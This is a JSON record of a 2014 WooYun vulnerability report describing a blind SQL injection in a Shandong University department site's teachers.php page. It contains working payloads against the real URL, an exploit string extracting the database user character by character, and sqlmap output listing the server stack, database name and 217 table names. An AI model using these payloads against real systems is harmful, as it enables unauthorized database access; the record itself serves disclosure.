{"id": 41521, "wybug_id": "wooyun-2014-088527", "wybug_title": "山东大学sql注入", "wybug_corp": "山东大学", "wybug_author": "kwin", "wybug_date": "2014-12-25 18:47", "wybug_open_date": "2014-12-30 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 继续sql注入 详细说明：  问题URL：http://www.ee.sdu.edu.cn/xuandao/teachers.php?user_id=76问题参数：user_id=76以下是poc：http://www.ee.sdu.edu.cn/xuandao/teachers.php?user_id=76 and 1=1\n\nhttp://www.ee.sdu.edu.cn/xuandao/teachers.php?user_id=76 and 1=11\n\n   漏洞证明：  以下是exp:http://www.ee.sdu.edu.cn/xuandao/teachers.php?user_id=76%20and%20ascii%28substr%28user%28%29,1,1%29%29%3C109\n\nsqlmap跑了下当前用户：\n\n当前数据库：\n\n当前库中的表，竟然有217张表，也是醉了\n\nsqlmap identified the following injection points with a total of 80 HTTP(s) requests:---Parameter: user_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user_id=76 AND 7347=7347---web application technology: PHP 5.2.13, Apache 2.2.15back-end DBMS: MySQL >= 5.0.0current user:    'ee@localhost'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: user_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user_id=76 AND 7347=7347---web application technology: PHP 5.2.13, Apache 2.2.15back-end DBMS: MySQL 5current database:    'ee'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: user_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user_id=76 AND 7347=7347---web application technology: PHP 5.2.13, Apache 2.2.15back-end DBMS: MySQL 5sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: user_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user_id=76 AND 7347=7347---web application technology: PHP 5.2.13, Apache 2.2.15back-end DBMS: MySQL 5Database: ee[217 tables]+-----------------------+| adminconfig           || all_name              || apply                 || back                  || callboard             || class_lei             || dede_addon18          || dede_addonarticle     || dede_addonimages      || dede_addonsoft        || dede_addonspec        || dede_admin            || dede_admintype        || dede_advancedsearch   || dede_arcatt           || dede_arccache         || dede_archives         || dede_arcmulti         || dede_arcrank          || dede_arctiny          || dede_arctype          || dede_area             || dede_channeltype      || dede_co_htmls         || dede_co_mediaurls     || dede_co_note          || dede_co_onepage       || dede_co_urls          || dede_diyforms         || dede_dl_log           || dede_downloads        || dede_erradd           || dede_feedback         || dede_flink            || dede_flinktype        || dede_freelist         || dede_guestbook        || dede_homepageset      || dede_keywords         || dede_log              || dede_member           || dede_member_3         || dede_member_35        || dede_member_company   || dede_member_feed      || dede_member_flink     || dede_member_friends   || dede_member_group     || dede_member_guestbook || dede_member_model     || dede_member_msg       || dede_member_operation || dede_member_person    || dede_member_person4   || dede_member_pms       || dede_member_snsmsg    || dede_member_space     || dede_member_stow      || dede_member_stowtype  || dede_member_tj        || dede_member_type      || dede_member_vhistory  || dede_moneycard_record || dede_moneycard_type   || dede_mtypes           || dede_multiserv_config || dede_myad             || dede_myadtype         || dede_mytag            || dede_payment          || dede_plus             || dede_pwd_tmp          || dede_ratings          || dede_scores           || dede_search_cache     || dede_search_keywords  || dede_sgpage           || dede_shops_delivery   || dede_shops_orders     || dede_shops_products   || dede_shops_userinfo   || dede_softconfig       || dede_sphinx           || dede_stepselect       || dede_sys_enum         || dede_sys_module       || dede_sys_set          || dede_sys_task         || dede_sysconfig        || dede_szdw             || dede_tagindex         || dede_taglist          || dede_uploads          || dede_verifies         || dede_vote             || dede_vote_member      || en_addon18            || en_addonarticle       || en_addonimages        || en_addonsoft          || en_addonspec          || en_admin              || en_admintype          || en_advancedsearch     || en_arcatt             || en_arccache           || en_archives           || en_arcmulti           || en_arcrank            || en_arctiny            || en_arctype            || en_area               || en_channeltype        || en_co_htmls           || en_co_mediaurls       || en_co_note            || en_co_onepage         || en_co_urls            || en_diyforms           || en_dl_log             || en_downloads          || en_erradd             || en_feedback           || en_flink              || en_flinktype          || en_freelist           || en_guestbook          || en_homepageset        || en_keywords           || en_log                || en_member             || en_member_3           || en_member_company     || en_member_feed        || en_member_flink       || en_member_friends     || en_member_group       || en_member_guestbook   || en_member_model       || en_member_msg         || en_member_operation   || en_member_person      || en_member_person4     || en_member_pms         || en_member_snsmsg      || en_member_space       || en_member_stow        || en_member_stowtype    || en_member_tj          || en_member_type        || en_member_vhistory    || en_moneycard_record   || en_moneycard_type     || en_mtypes             || en_multiserv_config   || en_myad               || en_myadtype           || en_mytag              || en_payment            || en_plus               || en_pwd_tmp            || en_ratings            || en_scores             || en_search_cache       || en_search_keywords    || en_sgpage             || en_shops_delivery     || en_shops_orders       || en_shops_products     || en_shops_userinfo     || en_softconfig         || en_sphinx             || en_stepselect         || en_sys_enum           || en_sys_module         || en_sys_set            || en_sys_task           || en_sysconfig          || en_szdw               || en_tagindex           || en_taglist            || en_teacher            || en_uploads            || en_verifies           || en_vote               || en_vote_member        || friend                || larchives             || leaveword             || login_teacher         || oklist                || teacher               || user_reg              || userlgtime            || yan_adminconfig       || yan_all_name          || yan_apply             || yan_back              || yan_callboard         || yan_class_lei         || yan_friend            || yan_larchives         || yan_leaveword         || yan_oklist            || yan_yzlove_admin      || yjs_adminconfig       || yjs_all_name          || yjs_apply             || yjs_back              || yjs_callboard         || yjs_class_lei         || yjs_friend            || yjs_larchives         || yjs_leaveword         || yjs_oklist            || yjs_yzlove_admin      || yzlove_admin          |+-----------------------+   修复方案：     版权声明：转载请注明来源 kwin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 18:48 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}